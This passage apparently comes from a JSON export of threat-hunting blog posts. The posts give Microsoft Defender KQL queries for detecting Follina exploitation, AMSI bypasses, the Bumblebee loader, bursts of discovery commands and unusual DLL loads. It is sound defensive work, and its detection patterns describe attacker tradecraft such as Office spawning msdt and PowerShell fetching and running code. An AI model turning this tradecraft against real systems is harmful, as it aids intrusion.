StartedParentProcessFolderPath, StartedProcessGrandParent, Timestamp This also worked fine, and the launched process was returned. Process launch recorded after the LNK file was opened. And this finishes the current blog post. These are the scenarios that I’ve witnessed and should likely work relatively fine when hunting for the threat actors using the ISO files. The queries do not target explicitly malicious activity, rather they are trying to look for executions from ISO files. Depending on the environment, this can be legitimately happen quite often so your mileage may vary. "
    }, {
    "id": 42,
    "url": "https://threathunt.blog/detecting-follina-with-mde/",
    "title": "Detecting Follina with MDE",
    "body": "2022/06/05 - About a week ago there was a new zero-day office “zero-click” vulnerability noted. This vulnerability was dubbed as Follina by Kevin Beaumont who discovered it while investigating a document originating from Belarus. An article by Kevin is available here. This is very interesting approach to exploit the Office applications, which apparently also applies for powershell. exe when using invoke-webrequest, if using earlier PowerShell version than 6. Also, affecting the net. webclient in case you are wondering. There likely are quite a few queries to detect this stuff already out there, however the more the merrier! I decided to run the available POC code myself to investigate how this looks like in Defender for Endpoint. The POC that I used is available here. I ran the POC in my lab to see how the execution actually looks like, with a throw-away machine. I only recently rebuilt this part of my home lab and it is interesting to see how well it works now. Msdt. exe should be spawned as a child process after the vulnerability has been abused. The POC code launches msdt. exe and this is easy to catch. DeviceProcessEvents | where InitiatingProcessFileName has_any ( winword. exe , excel. exe , outlook. exe , powershell. exe , powerpnt. exe )| where FileName =~  msdt. exe | project Timestamp, DeviceName, InitiatingProcessFileName, InitiatingProcessCommandLine, FileName, ProcessCommandLineWith the POC code, this is the result. Simple query to find exploitation of the vulnerability. When the malicious file is being launched there I thought that there should be a network connection initiated either by msdt. exe or sdiagnhost. exe. The original query can be joined to this data from the same device. Rather interestingly, there was no network connection observed with MDE. I did run the POC on the localhost so maybe for some reason the network connection was not saved to the localhost or something. I hosted the web server on another host and then the network connection was reported, however it was reported of being initiated by winword. exe and not msdt. exe/sdiagnhost. exe as I expected. Could be that I remember wrong how the exploit works, or there are differences depending on what is being done. This was also the reason why I did not pick-up the first connection - in reality it was made towards the localhost, I just thought that it was something else that Word was doing - silly of me as the remote port was 80. So even the locally ran exploitation was recorded as expected. Here is the query. DeviceProcessEvents | where InitiatingProcessFileName has_any ( winword. exe , excel. exe , outlook. exe , powershell. exe )| where FileName =~  msdt. exe | project Timestamp, DeviceName, InitiatingProcessFileName, InitiatingProcessCommandLine, FileName, ProcessCommandLine, InitiatingProcessId, InitiatingProcessCreationTime| join (DeviceNetworkEvents| where InitiatingProcessFileName has_any ( winword. exe , excel. exe , outlook. exe , powershell. exe )| where RemoteUrl !endswith  microsoft. com | where RemoteUrl !endswith  live. com | project DeviceName, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessId, InitiatingProcessCreationTime, RemoteIP, RemotePort, RemoteUrl, RemoteIPType) on DeviceName, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessId, InitiatingProcessCreationTime| project DeviceName, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessId, InitiatingProcessCreationTime, RemoteIP, RemotePort, RemoteUrl, RemoteIPType, FileName, ProcessCommandLineSo this basically looks for msdt. exe being spawned by office apps or powershell. exe and joins the data to a network connection made by the same process, filtering out some MS domains. Results shown below. The results, leaving out timestamp and device name.       It is likely that there are more domains that could be filtered out in the DeviceNetworkEvents. Also, another filter “_   where RemoteIPType == “Public”_” should probably be added as it is very unlikely that the attacker server would be running locally. At least with the POC this seems to work nicely, not sure of production though as I have not tested it yet. I would assume that it should be fine though.    I add the query which is looking for the network connection being made by msdt. exe or sdiagnhost. exe too, as the connection is reported in multiple articles of being made by these processes. This does not differ from the earlier query much though.   DeviceProcessEvents | where InitiatingProcessFileName has_any ( winword. exe , excel. exe , outlook. exe , powershell. exe , powerpnt. exe )| where FileName =~  msdt. exe | project Timestamp, DeviceName, InitiatingProcessFileName, InitiatingProcessCommandLine, FileName, ProcessCommandLine| join (DeviceNetworkEvents| where InitiatingProcessFileName has_any ( msdt. exe , sdiagnhost. exe )| project DeviceName, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessId, InitiatingProcessCreationTime, RemoteIP, RemotePort, RemoteUrl, RemoteIPType) on DeviceName| project DeviceName, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessId, InitiatingProcessCreationTime, RemoteIP, RemotePort, RemoteUrl, RemoteIPType, FileName, ProcessCommandLineIt seems that the activity that is started after the vulnerability is abused is launched as a child of svchost. exe. This could also be included in a query, where we take the timestamp of the action and then join in to the events done by svchost. exe shortly after, but this can cause quite a lot of false-positives depending on the filters. I think that these queries should be good to get started with in hunting the actual exploitation and thus I will not go further in the area. Also, as a bonus, my new POC/MW lab works nicely and as expected. Yay me! "
    }, {
    "id": 43,
    "url": "https://threathunt.blog/amsi-bypass-mde-detection/",
    "title": "AMSI bypass detection with MDE",
    "body": "2022/05/27 - Microsoft has developed AMSI to detect malicious content to be launched by Powershell. The AMSI. dll is injected to the process memory after which the Antivirus programs can use the API to scan the content before it is being launched. If the content is malicious the execution will be prevented. This function works with Defender antivirus and many of the other antivirus’s are also detecting this function. There is an awesome list of different AMSI bypasses written by the Pentest Laboratories: https://pentestlaboratories. com/2021/05/17/amsi-bypass-methods/ - I am using this article to test out the bypasses. Some of the bypasses do not work anymore at least without tinkering so I will be targeting some of those that are working out of the box. Powershell version 2 downgradeThe easiest way that I know of to bypass the AMSI would be downgrading to Powershell version 2. This is simple to do and there is a great MDE query for detecting this already in the Microsoft Sentinel and Microsoft 365 Defender repository, here. The repository has a plethora of very good and realistic queries to get hunting. Great place to look for queries and to check if your latest idea has already been covered there. I have been testing this before and the query works nicely and is not relying upon the commandline, which in my opinion is how it should be done. Forcing an errorForcing an error which is shown as the fifth option in the Pentest Laboratories article works fine. Forcing an error is still allowing to bypass the AMSI from the code that is launched after. Unfortunately, this seems to hide the activity from the Defender for endpoint console very well. So well that there isn’t really anything to look for. This can be seen from the Powershell logs though, if those are being sent to a SIEM. Powershell logs showing the bypass. The other described bypasses were blocked, obfuscated or not under the Forcing an error method. Also, many if not all the others that I found and tested where already blocked, but I did not look into the topic very intensively. I wanted to have at least a single functioning test to verify what I can actually see from the activity after the AMSI bypass had been initiated. Hunting for the AMSI bypassesGenerally, it seems that hunting for the actual AMSI bypasses seems to be relatively hard using only the MDE data. The registry based bypass should be easily doable, however because of the noise that it causes it is probably just not used in the wild. So maybe the hunting should be done against the actual behavior of the Powershell process. This is likely quite hard to do, unless pinpointing to very specific things. I try to not rely upon detecting something super specific like the cmdlets of the attack frameworks, rather I always try to think “step further” - catching the actual behavior instead of the indicators that might change. I created a query which is looking for powershell. exe connecting to public address and then joining the data to the recorded commands ran by MDE. Then, this data is further joined to the child processes of the same Powershell process. This has not been tested live and I think it will cause too much noise, however here goes: DeviceNetworkEvents | where InitiatingProcessParentFileName != @ SenseIR. exe | where ActionType == 'ConnectionSuccess' | where InitiatingProcessFileName has_any ( pwsh. exe , powershell. exe )| where RemoteUrl !contains  winatp-gw | where RemoteIPType ==  Public | project Timestamp, DeviceName,NetConTimestamp = Timestamp, RemoteIP, RemoteUrl, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessCreationTime, InitiatingProcessId, InitiatingProcessParentFileName| join kind= leftouter(DeviceEvents| where ActionType == 'PowerShellCommand' | project PsCommandTimestamp = Timestamp, DeviceName, InitiatingProcessCommandLine, InitiatingProcessCreationTime, InitiatingProcessFileName, InitiatingProcessId, AdditionalFields, PSCommand=extractjson( $. Command , AdditionalFields, typeof(string))) on InitiatingProcessCommandLine, InitiatingProcessCreationTime, InitiatingProcessFileName, InitiatingProcessId, DeviceName| join kind=leftouter(DeviceProcessEvents| project ChildProcessStartTime = Timestamp, ChildProcessName = FileName, ChildProcessSHA1 = SHA1, ChildProcessCommandline = ProcessCommandLine, InitiatingProcessCommandLine, InitiatingProcessCreationTime, InitiatingProcessFileName, InitiatingProcessId, DeviceName) on InitiatingProcessCommandLine, InitiatingProcessCreationTime, InitiatingProcessFileName, InitiatingProcessId, DeviceName| project DeviceName, NetConTimestamp, RemoteIP, RemoteUrl,InitiatingProcessParentFileName,InitiatingProcessFileName, InitiatingProcessCommandLine, PsCommandTimestamp, PSCommand, ChildProcessStartTime, ChildProcessName, ChildProcessSHA1, ChildProcessCommandlineUsability is quite dependent on the environment, however this should show if Powershell is used to connect to the internet and then some suspicious commands are ran. For example, using IEX (Invoke-Expression) after AMSI bypass might get caught if looking at the data produced by the query. Here is an example of the data from my tests: Example output of the query. There are many other anomalous things which could be hunted for. Another example which is a little lame, is if Powershell is used to create an . exe file. Then, the data is joined to a process launching the binary file which was created by Powershell. This is not hugely relevant as the threat actors are relatively rarely using Powershell to download additional binaries that are then launched, more commonly the actual malicious deed is done by using Powershell code. This makes the use case for the query little niche, but maybe these can food for thought; try to think of how the threat actors are actually using Powershell and how that could be found by looking into the Powershell behavior. DeviceFileEvents | where InitiatingProcessParentFileName != @ SenseIR. exe | where InitiatingProcessFileName has_any ( pwsh. exe , powershell. exe )| where ActionType == 'FileCreated' | where FileName endswith  . exe | project Timestamp, FileCreationTimestamp = Timestamp, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessParentFileName, SHA1, FileName, DeviceName| join (DeviceProcessEvents| project DeviceName, SHA1, FileName, ProcessCreationTimestamp = Timestamp, ProcessCommandLine, FolderPath, ProcessCreationParentName = InitiatingProcessFileName, ProcessCreationParentCmdline = InitiatingProcessCommandLine, ProcessCreationParentFolderPath = InitiatingProcessFolderPath, ProcessCreationGrandParentName = InitiatingProcessParentFileName) on FileName, SHA1, DeviceName| project DeviceName, FileCreationTimestamp, FileName, SHA1, ProcessCreationTimestamp, FolderPath, ProcessCommandLine, ProcessCreationParentName, ProcessCreationParentCmdline, ProcessCreationParentFolderPath, ProcessCreationGrandParentNameThe following picture shows the results, however they are before making exclusion for the SenseIR. exe process. I got no hits without the filter, as I didn’t run any test to verify the functionality. Results of the query when not filtering out SenseIR. exe. I would like to hunt for the actual AMSI bypasses as it would be much more pinpointed than trying to catch malicious behavior of the Powershell process. I am sure that some of the AMSI bypass techniques are catch-able with the MDE data, however I didn’t want to go through analyzing them all. This is more or less a relatively quick analysis of the known AMSI bypasses to see what works, what does not and what is detectable currently. Most of the bypasses that I came upon were already blocked, so they are nothing to worry about. Maybe more interesting angle would be to create rules to catch Defender AV bypasses, however I think that they might be already alerted by MDE so that might not be really needed. "
    }, {
    "id": 44,
    "url": "https://threathunt.blog/bzz-bzz-bumblebee-loader/",
    "title": "Bzz.. Bzz.. Bumblebee loader",
    "body": "2022/05/08 - Quite recently, a new loader has been popping up. This loader is likely been developed to counter the Microsoft’s change to the macro behavior, as the macros will be disabled on the documents that have been downloaded from the internet. This is a very welcome change as macros have been often used by the threat actors to launch the malicious code from the maldocs. Now that this will be harder to the threat actors they are creating new creative ways to get the initial foothold after a phishing attack. One of the new ways that has been observed in the wild is the bumblebee loader. This new loader will be delivered in format of an attachment, or a link within a phishing email. The user is then directed to a legitimate web service (for example, one drive) from which the user downloads a password-protected ZIP file, with the password in the email body. The zip contains an ISO file, which then contains two files - . lnk and . dat files. If the lnk file is started the bumblebee loader will be ran from the . dat file. There are several ways how this initial approach could be potentially found with Defender for Endpoint. To me it sounds like that the initial creation of the ISO file joined to the creation of the ZIP file by a browser could be a good approach. This could be maybe joined to network connections too, however it gets a little heavy and I leave it out for now. So the logic of this query is explained above. I do use the time based join that I’ve used before on an earlier blog post. This is because the process that creates the ISO file is different from the process that created the archive file. Depending on the environment this could potentially need more joins to reduce noise. ISO files are relatively rare in some environments but much more common in the others. Also, this query is only looking for creations of the ISO + archive files - this does not yet mean that anything was executed. let lookupWindow = 10min; let lookupBin = lookupWindow / 2. 0; DeviceFileEvents | where FileName endswith  . iso | where ActionType == 'FileCreated'| extend TimeKey = bin(Timestamp, lookupBin)| project DeviceName, IsoCreationTime = Timestamp, IsoCreationFileName = FileName, IsoCreationFolderPath = FolderPath, IsoCreationSHA1 = SHA1, TimeKey, IsoCreationProcessName = InitiatingProcessFileName, IsoCreationProcessCmdline = InitiatingProcessCommandLine, IsoCreationProcessFolderPath = InitiatingProcessFolderPath, IsoCreationParentName = InitiatingProcessParentFileName| join (DeviceFileEvents | extend ArchiveCreationTime = Timestamp| where FileName endswith  . zip  or FileName endswith  . rar  or FileName endswith  . 7z | where InitiatingProcessFileName =~  chrome. exe  or InitiatingProcessFileName =~  firefox. exe  or InitiatingProcessFileName =~  msedge. exe  or InitiatingProcessFileName =~  iexplore. exe | extend TimeKey = range(bin(Timestamp-lookupWindow, lookupBin), bin(Timestamp, lookupBin), lookupBin) | mv-expand TimeKey to typeof(datetime)| project DeviceName, IsoCreationActionType= ActionType, ArchiveCreationTime = Timestamp, ArchiveCreationFileName = FileName, ArchiveCreationFolderPath = FolderPath, ArchiveCreationSHA1 = SHA1, TimeKey, ArchiveCreationProcessName = InitiatingProcessFileName, ArchiveCreationProcessCmdline = InitiatingProcessCommandLine, ArchiveCreationProcessFolderPath = InitiatingProcessFolderPath, ArchiveCreationParentName = InitiatingProcessParentFileName) on DeviceName, TimeKey| project DeviceName, IsoCreationTime, IsoCreationFileName, ArchiveCreationFileName, IsoCreationProcessName, IsoCreationActionType, IsoCreationProcessCmdline, IsoCreationProcessFolderPath, ArchiveCreationProcessName, ArchiveCreationProcessCmdline, IsoCreationParentName, ArchiveCreationTime, ArchiveCreationFolderPath, TimeKey, ArchiveCreationProcessFolderPath, ArchiveCreationParentName, IsoCreationFolderPath, IsoCreationSHA1, ArchiveCreationSHA1As you can see from the query, I like to rename some of the fields. This does make it easier at least for me to understand the output especially when joining the data from multiple tables with different process names. I do this almost every time on my queries and I do also suggest it to others as well. The archive creation query is not limited to “FileCreated” events. This is because of how the modern browsers work, as they stage the files with different names and then in the end renames the file to the final format. To test this out I created an empty file with the abbreviation of . ISO. Then I archived the file to a zip file and uploaded to Onedrive - from which I downloaded it and extracted the contents. The query matches the iso and archive creations. The query works. There are multiple matches as there are multiple actions taken on the archive creation query. The default inner unique join takes one random entry from the left and joins it to all matches on right. This could be refined further but I am quite happy with this. One way to limit the results would be to limit the ActionType to “FileRenamed” on the archive creation query. The great article by Proofpoint (already linked before, but again here) states the process path after the malicious code is launched. It is basically cmd. exe -&gt; cmd. exe -&gt; rundll32. exe with certain switches. This should be easy enough. DeviceProcessEvents | where InitiatingProcessParentFileName =~  cmd. exe | where InitiatingProcessFileName =~  cmd. exe | where InitiatingProcessCommandLine contains  IternalJob | where InitiatingProcessCommandLine contains  rundll32 | where FileName =~  rundll32. exe | where ProcessCommandLine contains  IternalJob | project Timestamp, DeviceName, InitiatingProcessParentFileName, InitiatingProcessFileName, InitiatingProcessCommandLine, FileName, ProcessCommandLineTo keep the query efficient I didn’t do any joins. Unfortunately, the cmdline of the parent process is not recorded here so no filtering can be done based on that, unless joining the data. The query does not produce any results in my testing environment but your mileage may vary. I haven’t tested the queries in this post in any production environments yet. These queries are relatively simple and likely will catch only partial and early versions of the loader, however I think they are a great start. Using these to start and then developing them a little further can produce nice results in catching the new type of loader. This data could of course also be joined further to get less results and to get more information out of the activity. Also - someone might have noticed that I have changed the theme of the blog. I liked the old one but I migrated to another host as the first one was quite unresponsive at least from Europe. While doing that I changed the theme to handle couple of things better. I think there might be little bug here and there still with this but I will fix them when I get a chance. EDIT: Fixed a typo in the latter query. "
    }, {
    "id": 45,
    "url": "https://threathunt.blog/running-multiple-instances-of-discovery-commands-in-short-period-of-time/",
    "title": "Running multiple instances of discovery commands in short period of time",
    "body": "2022/04/30 - When the attackers have been able to gain initial access to the environment they are often running different kind of commands to gain further information of the environment. The commands that are being run are often the same in the attacks thus making it possible to hunt for these commands being run on a quick succession. The issue with the approach is that there is a ton of legitimate processes that are doing exactly the same. The commands are the same and there are many legitimate reasons to run them within a short period of time. This makes hunting a little more interesting, how to actually spot the anomalous instances from the legitimate actions? This can be partly accommodated within the queries, however the point of threat hunting is that there is analysis done against the data. If the queries are able to pick up the anomalies reliably, why not turn the queries as detection rules? The discovery commands are often being run on a very early stage of the attack after gaining the initial access. Qbot, IcedID and the others are running at least some discovery commands to gain further information from the environment after their initial payload has been executed. This makes this a great target for threat hunting, the earlier the attack can be spotted the better. Unfortunately, the amount of the commands that are actually being run is not as high as one would hope, in some examples only couple of commands have been actually executed - this makes finding the actual anomalies a little challenging. Getting started with the query, I am using some of the most commonly seen commands as an example here. There are many others that could be included. I am using the DeviceProcessEvents table and the has_any operator to limit to the discovery process launches. I was thinking on how to count the amount of launches in short period of time (1 minute in this case) . First, I limited the results to only a single parent process which makes creating the query a lot easier. At this stage, I just wanted to get the counts. DeviceProcessEvents| where FileName has_any ( nslookup. exe , net. exe , ipconfig. exe , nltest. exe , systeminfo. exe , wmic. exe , ping. exe )| summarize count() by DeviceName,InitiatingProcessFileName,InitiatingProcessCreationTime,InitiatingProcessId,bin(Timestamp, 1m)After getting the counts I can join the data to get more details. Now I just used a simple join without thinking too much what join flavor should be used, although I guess this works fine. I also add a limitation so that only the instances where there has been more than 5 occurrences will be returned. DeviceProcessEvents| where FileName has_any ( nslookup. exe , net. exe , ipconfig. exe , nltest. exe , systeminfo. exe , wmic. exe , ping. exe )| summarize count() by DeviceName,InitiatingProcessFileName,InitiatingProcessCreationTime,InitiatingProcessId,bin(Timestamp, 1m)| where count_ &gt; 5| join (DeviceProcessEvents| where FileName has_any ( nslookup. exe , net. exe , ipconfig. exe , nltest. exe , systeminfo. exe , wmic. exe , ping. exe )) on DeviceName,InitiatingProcessFileName,InitiatingProcessCreationTime,InitiatingProcessId| project DeviceName, Timestamp, Timestamp1, count_, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessParentFileName| sort by DeviceName, count_, TimestampThis query works fine although - for example - the senseir. exe has to be excluded from the results as MDE is running the commands as of itself. The problem with this approach is that it limits the results to a single parent process. This might be sometimes desirable, however often in the actual attacks the process launching the commands might change. The first approach that I thought of to handle the potentially changing processes is to do the join on time basis. The approach for a time based join has been documented nicely in the KQL documentation: https://docs. microsoft. com/en-us/azure/data-explorer/kusto/query/join-timewindow. let lookupWindow = 1min;let lookupBin = lookupWindow / 2. 0;DeviceProcessEvents| where FileName has_any ( nslookup. exe , net. exe , ipconfig. exe , nltest. exe , systeminfo. exe , wmic. exe , ping. exe )| summarize count() by DeviceName,bin(Timestamp, 1m)| where count_ &gt; 5| extend AnomalyStartTime = Timestamp| extend TimeKey = bin(Timestamp, lookupBin)| join (DeviceProcessEvents| where FileName has_any ( nslookup. exe , net. exe , ipconfig. exe , nltest. exe , systeminfo. exe , wmic. exe , ping. exe )| extend ProcessLaunchTime = Timestamp| extend TimeKey = range(bin(Timestamp-lookupWindow, lookupBin),               bin(Timestamp, lookupBin),               lookupBin)| mv-expand TimeKey to typeof(datetime)) on DeviceName, TimeKey| where (ProcessLaunchTime - AnomalyStartTime) between (0m . . lookupWindow)| project DeviceName, Timestamp, Timestamp1, count_, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessParentFileName| sort by DeviceName, count_, TimestampWith this query the results should be visible even if the process launching the commands changes. In reality, this can turn the query to be relatively impossible to run though. There will likely be a huge amount of false-positives in real environments. Likely needs quite a lot of tinkering to make it more efficient and to rule out false-positives  - this might work in more static environment just by ruling out the processes that do cause the noise. To test this out I decided to run couple of commands with cmd and some more with powershell. I run three commands with powershell and another 3 with cmd. I also increased the value of the summarize to 5 minutes because of how bin works. It rounds the values down to an integer, for example 10:50 and with 1 minutes join it shows only events from 10:50-10:51. With increasing the value to 5 minutes it covers the anomalies more reliably, unfortunately in reality this isn’t a perfect approach. There probably is a better one, which I don’t know of.   Anyway, here is the current query. let lookupWindow = 5min;let lookupBin = lookupWindow / 2. 0;DeviceProcessEvents| where InitiatingProcessParentFileName != @ SenseIR. exe | where FileName has_any ( nslookup. exe , net. exe , ipconfig. exe , nltest. exe , systeminfo. exe , wmic. exe , ping. exe )| summarize count() by DeviceName,bin(Timestamp, 5m)| where count_ &gt; 5| extend AnomalyStartTime = Timestamp| extend TimeKey = bin(Timestamp, lookupBin)| join (DeviceProcessEvents| where InitiatingProcessParentFileName != @ SenseIR. exe | where FileName has_any ( nslookup. exe , net. exe , ipconfig. exe , nltest. exe , systeminfo. exe , wmic. exe , ping. exe )| extend ProcessLaunchTime = Timestamp| extend TimeKey = range(bin(Timestamp-lookupWindow, lookupBin),               bin(Timestamp, lookupBin),               lookupBin)| mv-expand TimeKey to typeof(datetime)) on DeviceName, TimeKey| where (ProcessLaunchTime - AnomalyStartTime) between (0m . . lookupWindow)| project DeviceName, AnomalyStartTime, ProcessLaunchTime, count_, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessParentFileName| sort by DeviceName, count_, TimestampResults of the test I ran, 3 commands initiated with cmd. exe and 3 with powershell. Results from both processes running the discovery commands. So this sort of works, although I forgot to change the field names on the output, oops. I corrected this to the original query with also adding the commandline for the initiating process. This also currently covers only a portion of the commands that the attackers like to run, although these are some of the most common ones. In reality, depending on the environment, this might be causing so much of noise that it is unusable. Usually this is caused by same command being run multiple times in a row. The next query tries to remove the results where the same binary/command has been run in a row. I am using materialize to cache the results from the first join so that I can join back to the cached data instead of making a new query. This way I can use the AnomalyStartTime column for joining purposes. This of course is somewhat untrustworthy as there can be unrelated  processes launching stuff at the same time which can mess up the results. let lookupWindow = 5min; let lookupBin = lookupWindow / 2. 0; let GetTheEvents = materialize (DeviceProcessEvents | where InitiatingProcessParentFileName != @ SenseIR. exe  | where FileName has_any ( nslookup. exe , net. exe , ipconfig. exe , nltest. exe , systeminfo. exe , wmic. exe , ping. exe ) | summarize count() by DeviceName,bin(Timestamp, 5m) | extend AnomalyStartTime = Timestamp | extend TimeKey = bin(Timestamp, lookupBin)| where count_ &gt; 5| join ( DeviceProcessEvents | where InitiatingProcessParentFileName != @ SenseIR. exe  | where FileName has_any ( nslookup. exe , net. exe , ipconfig. exe , nltest. exe , systeminfo. exe , wmic. exe , ping. exe ) | extend ProcessLaunchTime = Timestamp | extend TimeKey = range(bin(Timestamp-lookupWindow, lookupBin), bin(Timestamp, lookupBin), lookupBin) | mv-expand TimeKey to typeof(datetime) ) on DeviceName, TimeKey);GetTheEvents| summarize proccount = count() by FileName, count_, DeviceName, AnomalyStartTime| where proccount != count_| join kind=inner GetTheEvents on FileName, count_, DeviceName, AnomalyStartTime| project DeviceName, FileName, AnomalyStartTime, count_, proccount, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessFolderPath, InitiatingProcessCommandLine, InitiatingProcessParentFileName| sort by AnomalyStartTime, DeviceNameI tested  this by launching ipconfig couple of times in a row. Then I ran the query. The ipconfigs are shown in the output. Damn. The output does include the ran IPconfig as the count_ does not match the proccount. The reason for this is that svchost. exe was starting the process WMIC. exe at the same time which was not initiated by me. So this does not work if there are other processes launching the same binaries and makes this quite untrustworthy. I think this should still work with the first query where it is expected that a single process will launch all the discovery commands. So I modified the first one which then looked like this let GetTheEvents = materialize (DeviceProcessEvents| where InitiatingProcessParentFileName != @ SenseIR. exe  | where FileName has_any ( nslookup. exe , net. exe , ipconfig. exe , nltest. exe , systeminfo. exe , wmic. exe , ping. exe ) | summarize count() by DeviceName,FileName,InitiatingProcessFileName,InitiatingProcessCreationTime,InitiatingProcessId,bin(Timestamp, 5m) | where count_ &gt; 5| extend AnomalyStartTime = Timestamp | join (DeviceProcessEvents | where FileName has_any ( nslookup. exe , net. exe , ipconfig. exe , nltest. exe , systeminfo. exe , wmic. exe , ping. exe )) on DeviceName,InitiatingProcessFileName,InitiatingProcessCreationTime,InitiatingProcessId | project DeviceName, Timestamp, count_, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessParentFileName, AnomalyStartTime, ProcessStartTime = Timestamp1);GetTheEvents| summarize proccount = count() by FileName, count_, DeviceName, AnomalyStartTime| where proccount != count_| join kind=inner GetTheEvents on FileName, count_, DeviceName, AnomalyStartTime| sort by DeviceName, count_, TimestampNow the output seems to be correct, the ipconfig which I ran multiple times in a row is missing so it is filtered out. I still have no idea if this works in a live environment or not as I haven’t been able to test it. Or I guess it works but it might still cause whole lot of noise and the time based version will also cause issues as non-related processes will be running the same commands at the same time.       Once again, a relatively simple idea in my head seems to be a little bit hard to do in reality. I am sure that this is doable and I am a little stuck in my ways and there would be some grand way with KQL to do this more efficiently. It would be possible to limit the amount of same command being run by using the between operator instead of != in the final where clause. For example: _   where proccount !between ((count_/2) . . count_)_ might work better. Only testing in the actual environment would tell how well this works.    "
    }, {
    "id": 46,
    "url": "https://threathunt.blog/dll-image-loads-from-suspicious-locations-by-regsvr32-exe-rundll32-exe/",
    "title": "DLL image loads from suspicious locations by regsvr32.exe / rundll32.exe",
    "body": "2022/04/20 - DLL images are being used quite a lot by the attackers to load their malicious code. I’ve done several different queries that are targeting this attack technique. I have been having an idea of taking a look at DLL files that are being loaded from abnormal locations and then building more information around this. This is probably a relatively hard thing to do because of the amounts of DLL being loaded in the Windows environments. So, how to determine the suspicious locations? First things first, little bit of knowledge / research from the past shows that the attackers are often utilizing the same folders. Another approach which I am showing here is to look for the rare folders statistically with MDE. I am very bad at regex so there probably are typos in the regex used in the queries - sorry about that for all the regex lovers. The idea of the following query is to get the folder from the FolderPath column without the actual filename. This way it is relatively easy to spot the folders where there isn’t much dll:s being loaded. DeviceImageLoadEvents| where Timestamp &gt; ago(1h)| extend folder = extract(@ . *\\ , 0, FolderPath)| summarize count() by folderUnfortunately, there are way too many of these folders. I tried to apply filtering only targeting ProgramData and users folders. This did not bring much luck and was still just absolutely ridiculously too noisy even in my testing environment with only couple of devices.   DeviceImageLoadEvents | where FolderPath startswith @ C:\users  or FolderPath matches regex @ . :\\ProgramData. [^\\\s]+. dll | where Timestamp &gt; ago(1h)| extend folder = extract(@ . *\\ , 0, FolderPath) | summarize count() by folderAs this seemed to be once again those missions that seem just a little bit too much for my brains at least for now I decided to move on towards targeting only rundll32. exe and regsvr32. exe. DeviceImageLoadEvents| where Timestamp &gt; ago(30d)| where InitiatingProcessFileName =~  regsvr32. exe  or InitiatingProcessFileName =~  rundll32. exe | where FolderPath startswith @ C:\users  or FolderPath matches regex @ . :\\ProgramData. [^\\\s]+. dll  or FolderPath matches regex @ . :\\Windows. [^\\\s]+. dll | extend folder = extract(@ . *\\ , 0, FolderPath) | summarize count() by folderEven this can be a little bit too noisy. Checking the individual DLL files by file SHA1 hash shows that there is hope and most of the DLL files are being loaded quite often, more than 10 times. I am trying to look for the ones that are more rare so this can be a good place to get further. DeviceImageLoadEvents| where Timestamp &gt; ago(30d)| where InitiatingProcessFileName =~  regsvr32. exe  or InitiatingProcessFileName =~  rundll32. exe | where FolderPath startswith @ C:\users  or FolderPath matches regex @ . :\\ProgramData. [^\\\s]+. dll  or FolderPath matches regex @ . :\\Windows. [^\\\s]+. dll | extend folder = extract(@ . *\\ , 0, FolderPath) | summarize count() by SHA1At this stage I need to do a bit of filtering on the data. Because of this I will use the materialize operator which caches the results so I don’t have to run the same query twice. Also, I only project the columns that I am interested of while also giving some of the columns more easy to understand names. let GenerateDLLloads = materialize (DeviceImageLoadEvents| where Timestamp &gt; ago(7d)| where InitiatingProcessFileName =~  regsvr32. exe  or InitiatingProcessFileName =~  rundll32. exe | where FolderPath startswith @ C:\users  or FolderPath matches regex @ . :\\ProgramData. [^\\\s]+. dll  or FolderPath matches regex @ . :\\Windows. [^\\\s]+. dll | extend folder = extract(@ . *\\ , 0, FolderPath)| project LoadedDllSHA1 = SHA1, LoadedDllName = FileName, DllLoadTimestamp = Timestamp, DeviceId, DeviceName, folder, DllLoadProcessCommandLine = InitiatingProcessCommandLine, DllLoadProcessCreationTime = InitiatingProcessCreationTime, DllLoadProcessFileName = InitiatingProcessFileName, DllLoadProcessProcessId = InitiatingProcessId, DllLoadProcessSHA1 = InitiatingProcessSHA1, DllLoadProcessParentCreationTime = InitiatingProcessParentCreationTime, DllLoadProcessParentFileName = InitiatingProcessParentFileName, DllLoadProcessParentId=InitiatingProcessParentId);GenerateDLLloads| summarize count() by LoadedDllSHA1 | where count_ &lt; 5 | join kind=inner GenerateDLLloads on LoadedDllSHA1 Now it is time to look for file creations of the loaded DLL files - again renaming some of the fields to make them easier to follow. It is likely that this could be done with commandline based queries - but what is the fun in that? My idea often is to create queries around the actual events rather than the commandlines of the started processes. This way it can be actually proven that the event took place. Also, sometimes the commandlines are not to be trusted although in the case of rundll32. exe and regsvr32. exe they probably would work. The query will also only show results if the file creation has been recorder - if there is no event for this the results are dropped. let GenerateDLLloads = materialize (DeviceImageLoadEvents| where Timestamp &gt; ago(7d)| where InitiatingProcessFileName =~  regsvr32. exe  or InitiatingProcessFileName =~  rundll32. exe | where FolderPath startswith @ C:\users  or FolderPath matches regex @ . :\\ProgramData. [^\\\s]+. dll  or FolderPath matches regex @ . :\\Windows. [^\\\s]+. dll | extend folder = extract(@ . *\\ , 0, FolderPath)| project LoadedDllSHA1 = SHA1, LoadedDllName = FileName, DllLoadTimestamp = Timestamp, DeviceId, DeviceName, folder, DllLoadProcessCommandLine = InitiatingProcessCommandLine, DllLoadProcessCreationTime = InitiatingProcessCreationTime, DllLoadProcessFileName = InitiatingProcessFileName, DllLoadProcessProcessId = InitiatingProcessId, DllLoadProcessSHA1 = InitiatingProcessSHA1, DllLoadProcessParentCreationTime = InitiatingProcessParentCreationTime, DllLoadProcessParentFileName = InitiatingProcessParentFileName, DllLoadProcessParentId=InitiatingProcessParentId);GenerateDLLloads| summarize count() by LoadedDllSHA1 | where count_ &lt; 5 | join kind=inner GenerateDLLloads on LoadedDllSHA1 | join ( DeviceFileEvents | where Timestamp &gt; ago(7d)| where ActionType == 'FileCreated' or ActionType == 'FileRenamed'| extend folder = extract(@ . *\\ , 0, 